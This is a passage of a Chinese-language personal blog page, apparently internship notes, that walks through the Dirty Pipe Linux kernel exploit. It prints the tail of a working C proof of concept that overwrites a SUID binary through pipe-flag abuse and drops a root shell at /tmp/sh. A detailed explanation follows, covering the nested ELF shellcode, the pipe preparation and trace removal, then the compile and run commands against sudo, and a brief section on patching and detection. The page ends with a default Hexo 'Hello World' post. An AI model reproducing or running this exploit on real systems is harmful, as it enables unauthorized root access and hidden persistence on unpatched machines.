the</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	nbytes = write(p[<span class="number">1</span>], data, len);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; len) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s SUID\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">uint8_t</span> *data = elfcode;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(path, O_RDONLY);</span><br><span class="line">	<span class="type">uint8_t</span> *orig_bytes = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(elfcode));</span><br><span class="line">	lseek(fd, <span class="number">1</span>, SEEK_SET);</span><br><span class="line">	read(fd, orig_bytes, <span class="keyword">sizeof</span>(elfcode));</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] hijacking suid binary..\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hax(path, <span class="number">1</span>, elfcode, <span class="keyword">sizeof</span>(elfcode)) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[~] failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] dropping suid shell..\n&quot;</span>);</span><br><span class="line">	system(path);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] restoring suid binary..\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hax(path, <span class="number">1</span>, orig_bytes, <span class="keyword">sizeof</span>(elfcode)) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[~] failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/tmp/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-关键原理"><a href="#2-关键原理" class="headerlink" title="2.关键原理"></a><strong>2.关键原理</strong></h4><ul>
<li><code>splice()</code>:将文件内容直接复制到管道缓冲区，绕过常规的页缓存机制。</li>
<li><code>PIPE_BUF_FLAG_CAN_MERGE</code>:允许向管道缓冲区追加写入，导致目标文件被篡改。</li>
</ul>
<h4 id="3-代码解释"><a href="#3-代码解释" class="headerlink" title="3.代码解释"></a><strong>3.代码解释</strong></h4><p>以下是针对 <code>dirtypipez.c</code> 的 <strong>逐步骤深度分析</strong>，结合漏洞原理和代码实现细节。我们将从关键数据结构到完整攻击流程进行拆解：</p>
<p><strong>3.1 整体攻击流程概述</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[选择目标SUID文件] --&gt; B[备份原始字节]</span><br><span class="line">  B --&gt; C[注入恶意ELF代码]</span><br><span class="line">  C --&gt; D[执行被篡改的SUID文件]</span><br><span class="line">  D --&gt; E[生成/tmp/sh后门]</span><br><span class="line">  E --&gt; F[恢复SUID文件原内容]</span><br><span class="line">  F --&gt; G[触发root shell]</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>3.2 关键代码模块分析</strong></p>
<p><strong>3.2.1 ELF傀儡代码（Shellcode）</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> elfcode[] = &#123; ... &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>作用</strong>：</p>
<ul>
<li><p>这是一个双层嵌套的ELF文件（Matryoshka结构）</p>
</li>
<li><p><strong>外层ELF</strong>功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码描述</span></span><br><span class="line">fd = open(<span class="string">&quot;/tmp/sh&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC);</span><br><span class="line">write(fd, inner_elf_data, size);    <span class="comment">// 写入内层ELF</span></span><br><span class="line">chmod(<span class="string">&quot;/tmp/sh&quot;</span>, <span class="number">04755</span>);            <span class="comment">// 设置SUID权限</span></span><br><span class="line">close(fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>内层ELF</strong>功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setuid(<span class="number">0</span>);                         <span class="comment">// 提权到root</span></span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;/bin/sh&quot;</span>], <span class="literal">NULL</span>); <span class="comment">// 启动shell</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>技术特点</strong>：</p>
<ul>
<li>通过二进制硬编码绕过编译器依赖</li>
<li>自包含实现文件创建、权限修改、提权全流程</li>
</ul>
<hr>
<p><strong>3.2.2 prepare_pipe() 函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span> &#123;</span><br><span class="line">  pipe(p);                            <span class="comment">// 创建管道</span></span><br><span class="line">  <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ); <span class="comment">// 获取管道缓冲区总大小（默认64KB）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 阶段1：填满管道（设置PIPE_BUF_FLAG_CAN_MERGE）</span></span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    write(p[<span class="number">1</span>], buffer, min(r, <span class="keyword">sizeof</span>(buffer))); <span class="comment">// 分块写入垃圾数据</span></span><br><span class="line">    r -= n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 阶段2：排空管道（保留flags状态）</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    read(p[<span class="number">0</span>], buffer, min(r, <span class="keyword">sizeof</span>(buffer))); </span><br><span class="line">    r -= n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键作用</strong>：</p>
<ul>
<li>通过写满再排空管道，使得所有 <code>pipe_buffer</code> 的 <code>flags</code> 字段保留 <code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
<li>为后续利用创造未初始化flags的条件</li>
</ul>
<p><strong>内核数据结构</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;    <span class="comment">// 未初始化将保留前次值！</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>3.2.3 hax() 漏洞利用函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hax</span><span class="params">(<span class="type">char</span> *filename, <span class="type">long</span> offset, <span class="type">uint8_t</span> *data, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(filename, O_RDONLY);  <span class="comment">// 以只读方式打开目标文件</span></span><br><span class="line">  prepare_pipe(p);                    <span class="comment">// 准备特殊管道</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关键操作：splice + write</span></span><br><span class="line">  --offset;                           <span class="comment">// 调整到目标偏移前1字节</span></span><br><span class="line">  splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">// 引入1字节到管道</span></span><br><span class="line">  write(p[<span class="number">1</span>], data, len);             <span class="comment">// 注入恶意数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分步解析</strong>：</p>
<ol>
<li><strong>splice() 调用</strong>：<ul>
<li>从文件 <code>offset-1</code> 位置读取 <strong>1字节</strong> 到管道</li>
<li>将文件页缓存与管道缓冲区关联</li>
<li>此时 <code>pipe_buffer.flags</code> 仍为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
</ul>
</li>
<li><strong>write() 调用</strong>：<ul>
<li>利用 <code>flags</code> 标志的漏洞，将 <code>data</code> 写入文件页缓存</li>
<li>修改磁盘文件内容（即使目标文件是只读&#x2F;SUID）</li>
</ul>
</li>
</ol>
<p><strong>内存变化示意图</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始SUID文件内容： [ELF Header][...][Entry Point...]</span><br><span class="line">注入后：           [ELF Header][傀儡ELF代码][...]</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>3.2.4 main() 主流程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="comment">// 1. 备份原始字节</span></span><br><span class="line">  <span class="type">int</span> fd = open(path, O_RDONLY);</span><br><span class="line">  lseek(fd, <span class="number">1</span>, SEEK_SET);             <span class="comment">// 跳过ELF魔数(0x7F &#x27;ELF&#x27;)</span></span><br><span class="line">  read(fd, orig_bytes, <span class="keyword">sizeof</span>(elfcode)); <span class="comment">// 备份被覆盖区域</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 第一次hax调用：注入傀儡ELF</span></span><br><span class="line">  hax(path, <span class="number">1</span>, elfcode, <span class="keyword">sizeof</span>(elfcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 执行被篡改的SUID文件</span></span><br><span class="line">  system(path); <span class="comment">// 生成/tmp/sh</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. 第二次hax调用：恢复原始内容</span></span><br><span class="line">  hax(path, <span class="number">1</span>, orig_bytes, <span class="keyword">sizeof</span>(elfcode));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5. 触发root shell</span></span><br><span class="line">  system(<span class="string">&quot;/tmp/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>精妙设计</strong>：</p>
<ul>
<li>跳过ELF头部的 <code>0x7F</code> 字节（避免破坏魔数导致文件无法执行）</li>
<li>通过两次 <code>hax()</code> 实现「写入-执行-恢复」的无痕攻击</li>
<li>依赖SUID机制临时获得root权限创建后门文件</li>
</ul>
<hr>
<p><strong>3.3 技术细节深入</strong></p>
<p><strong>3.3.1 SUID利用原理</strong></p>
<ul>
<li><strong>目标文件选择</strong>：如 <code>/usr/bin/passwd</code> 等具有SUID权限的系统工具</li>
<li><strong>篡改后行为</strong>：<ul>
<li>原SUID文件执行时以root权限运行</li>
<li>被注入的代码创建 <code>/tmp/sh</code> 并赋予 <code>4755</code> 权限</li>
<li>恢复原文件内容消除痕迹</li>
</ul>
</li>
</ul>
<p><strong>3.3.2 偏移量计算</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lseek(fd, <span class="number">1</span>, SEEK_SET); <span class="comment">// 跳过0x7F字节</span></span><br></pre></td></tr></table></figure>

<ul>
<li>标准ELF文件起始字节为 <code>0x7F 0x45 0x4C 0x46</code></li>
<li>从偏移1开始覆盖，保留 <code>0x7F</code> 确保文件头有效性</li>
</ul>
<p><strong>3.3.3 漏洞限制规避</strong></p>
<ul>
<li><strong>页对齐检查</strong>：确保覆盖操作不跨页（代码已内置检查）</li>
<li><strong>文件大小限制</strong>：注入数据不得导致文件扩展</li>
</ul>
<hr>
<p><strong>3.4 防御与检测</strong></p>
<p><strong>3.4.1 漏洞修复</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade linux-image-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure>

<p><strong>3.4.2 运行时检测</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监控可疑的SUID文件修改</span></span><br><span class="line"><span class="built_in">sudo</span> auditctl -w /usr/bin/ -p war -k suid_modify</span><br></pre></td></tr></table></figure>

<p><strong>3.4.3 系统加固</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 限制非特权用户创建命名空间</span></span><br><span class="line">sysctl kernel.unprivileged_userns_clone=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除不必要的SUID权限</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm /4000 -<span class="built_in">exec</span> <span class="built_in">chmod</span> u-s &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<hr>
<p>通过以上分析，该PoC完整实现了：</p>
<ol>
<li><strong>隐蔽注入</strong>：通过管道机制绕过文件权限检查</li>
<li><strong>权限维持</strong>：创建持久化后门 <code>/tmp/sh</code></li>
<li><strong>痕迹消除</strong>：恢复原始SUID文件内容</li>
<li><strong>环境兼容</strong>：自适应不同SUID目标文件</li>
</ol>
<p>关键创新点在于将Dirty Pipe漏洞与ELF傀儡技术结合，实现「无文件」攻击效果。</p>
<h3 id="步骤3：编译PoC程序"><a href="#步骤3：编译PoC程序" class="headerlink" title="步骤3：编译PoC程序"></a>步骤3：编译PoC程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dirtypipe.c -o dirtypipe</span><br></pre></td></tr></table></figure>

<h3 id="步骤4：执行漏洞利用"><a href="#步骤4：执行漏洞利用" class="headerlink" title="步骤4：执行漏洞利用"></a>步骤4：执行漏洞利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirtypipez `which sudo`</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="C:\Users\H\AppData\Roaming\Typora\typora-user-images\image-20250202212132167.png" alt="image-20250202212132167"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cm6nqices0001i0tl4o551vmp" data-title="我的第一篇博客" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%9F%E4%BF%A1%E5%AE%9E%E4%B9%A0/" rel="tag">统信实习</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/21/hello-world/" class="article-date">
  <time class="dt-published" datetime="2025-01-21T09:20:50.415Z" itemprop="datePublished">2025-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/21/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/21/hello-world/" data-id="cm6nqicel0000i0tl1oi57xo2" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%9F%E4%BF%A1%E5%AE%9E%E4%B9%A0/" rel="tag">统信实习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E7%BB%9F%E4%BF%A1%E5%AE%9E%E4%B9%A0/" style="font-size: 10px;">统信实习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/01/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
          </li>
        
          <li>
            <a href="/2025/01/21/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>